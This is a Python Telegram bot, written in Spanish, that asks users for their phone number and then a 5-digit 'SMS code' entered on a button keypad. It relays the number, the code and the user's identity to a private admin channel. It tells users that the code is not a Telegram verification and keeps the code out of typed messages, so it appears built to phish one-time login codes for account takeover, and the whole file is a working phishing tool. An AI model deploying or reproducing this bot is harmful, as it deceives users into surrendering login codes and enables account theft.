import os
import logging
from datetime import datetime
from telegram import (
    Update, KeyboardButton, ReplyKeyboardMarkup,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ===== Config =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHANNEL_ID = int(os.getenv("ADMIN_CHANNEL_ID", "0"))  # -100xxxxxxxxxx (bot admin)

# ===== Log =====
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
log = logging.getLogger("sms-verify")

UD_PHONE = "phone"
UD_CODE  = "code"   # buffer local de los dígitos que el usuario marca

def share_phone_kb():
    btn = KeyboardButton("📲 Compartir mi número (recomendado)", request_contact=True)
    return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

def keypad(code_str: str):
    rows = [
        [InlineKeyboardButton("1", callback_data="d:1"),
         InlineKeyboardButton("2", callback_data="d:2"),
         InlineKeyboardButton("3", callback_data="d:3")],
        [InlineKeyboardButton("4", callback_data="d:4"),
         InlineKeyboardButton("5", callback_data="d:5"),
         InlineKeyboardButton("6", callback_data="d:6")],
        [InlineKeyboardButton("7", callback_data="d:7"),
         InlineKeyboardButton("8", callback_data="d:8"),
         InlineKeyboardButton("9", callback_data="d:9")],
        [InlineKeyboardButton("← Borrar", callback_data="del"),
         InlineKeyboardButton("0", callback_data="d:0"),
         InlineKeyboardButton("✅ Confirmar", callback_data="ok")],
        [InlineKeyboardButton("❌ Cancelar", callback_data="cancel")]
    ]
    progreso = " ".join(list(code_str)) if code_str else "—"
    text = (
        "🔐 *Verificación por SMS (no es de Telegram)*\n"
        "Introduce el *código de 5 dígitos* que te hemos enviado *vía SMS*.\n"
        "Marca cada número en el teclado y después toca *✅ Confirmar*.\n\n"
        f"Código: `{progreso}`"
    )
    return text, InlineKeyboardMarkup(rows)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data[UD_CODE] = ""
    context.user_data.pop(UD_PHONE, None)
    await update.message.reply_text(
        "Hola 👋\n"
        "Para continuar, comparte tu número con el botón de abajo.\n\n"
        "🔎 *Importante*: esto **NO** es verificación de Telegram. "
        "Es un código propio que te enviaremos por *SMS*.",
        reply_markup=share_phone_kb(),
        parse_mode="Markdown"
    )

async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Se dispara apenas el usuario toca el botón nativo."""
    if not update.message or not update.message.contact:
        return

    phone = update.message.contact.phone_number
    context.user_data[UD_PHONE] = phone
    context.user_data[UD_CODE] = ""

    user = update.effective_user
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    admin_text = (
        "📥 *Nuevo número recibido*\n"
        f"- Teléfono: `{phone}`\n"
        f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
        f"- Fecha/Hora: {stamp}"
    )

    # 1) Enviar al canal/grupo privado
    try:
        if ADMIN_CHANNEL_ID:
            await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
    except Exception as e:
        log.error("Error enviando a ADMIN_CHANNEL_ID: %s", e)
        # Plan B: avisar al usuario que te lo reenvíe
        await update.message.reply_text(
            "⚠️ Ocurrió un problema notificando al canal interno. "
            "Intentaremos de nuevo más tarde."
        )

    # 2) Mandar inmediatamente la botonera numérica al cliente
    await update.message.reply_text(
        "✅ Número recibido correctamente.\n\n"
        "Ahora introduce el *código de 5 dígitos* que te hemos enviado *vía SMS*.",
        parse_mode="Markdown"
    )
    text, kb = keypad(context.user_data[UD_CODE])
    await update.message.reply_text(text, reply_markup=kb, parse_mode="Markdown")

async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not q:
        return
    await q.answer()

    code = context.user_data.get(UD_CODE, "")
    data = q.data or ""

    if data.startswith("d:"):
        if len(code) < 5:
            code += data.split(":")[1]
    elif data == "del":
        code = code[:-1]
    elif data == "cancel":
        context.user_data[UD_CODE] = ""
        await q.edit_message_text("Operación cancelada. Puedes escribir cualquier cosa para reintentarlo.")
        return
    elif data == "ok":
        phone = context.user_data.get(UD_PHONE, "desconocido")
        user = update.effective_user
        stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        admin_text = (
            "🧩 *Código ingresado por el cliente*\n"
            f"- Teléfono: `{phone}`\n"
            f"- Código (SMS externo): `{code}`\n"
            f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
            f"- Fecha/Hora: {stamp}"
        )
        # Enviar al canal interno para tu verificación manual
        try:
            if ADMIN_CHANNEL_ID:
                await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
        except Exception as e:
            log.error("Error enviando código a ADMIN_CHANNEL_ID: %s", e)

        await q.edit_message_text("✅ ¡Gracias! Hemos recibido tu código. Te confirmaremos en breve.")
        context.user_data[UD_CODE] = ""
        return

    context.user_data[UD_CODE] = code
    text, kb = keypad(code)
    try:
        await q.edit_message_text(text, reply_markup=kb, parse_mode="Markdown")
    except Exception:
        # Si no permite cambiar texto (p. ej. límite), al menos actualiza la botonera
        await q.message.edit_reply_markup(reply_markup=kb)

async def re_show_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Si el usuario escribe algo después de compartir el número, re-mostramos la botonera."""
    if context.user_data.get(UD_PHONE):
        text, kb = keypad(context.user_data.get(UD_CODE, ""))
        await update.message.reply_text(text, reply_markup=kb, parse_mode="Markdown")
    else:
        await update.message.reply_text(
            "Primero comparte tu número con el botón de abajo.",
            reply_markup=share_phone_kb()
        )

def main():
    if not BOT_TOKEN:
        raise RuntimeError("Falta BOT_TOKEN")
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, on_contact))
    app.add_handler(CallbackQueryHandler(keypad_cb))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, re_show_keypad))

    app.run_polling()

if __name__ == "__main__":
    main()
